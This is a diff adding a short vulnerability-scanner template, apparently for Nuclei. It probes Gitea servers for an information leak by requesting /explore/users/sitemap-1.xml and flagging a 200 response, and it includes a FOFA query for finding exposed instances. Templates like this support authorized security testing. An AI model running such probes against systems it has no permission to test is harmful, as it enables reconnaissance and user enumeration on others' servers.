@@ -1,0 +1,19 @@
+id: poc-buh2krfmswn7vku5
+info:
+  name: Gitea sitemap-1.xml信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/buh2krfmswn7vku5'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: buh2krfmswn7vku5
+    fofa: title="Gitea"
+http:
+- raw:
+  - GET /explore/users/sitemap-1.xml HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
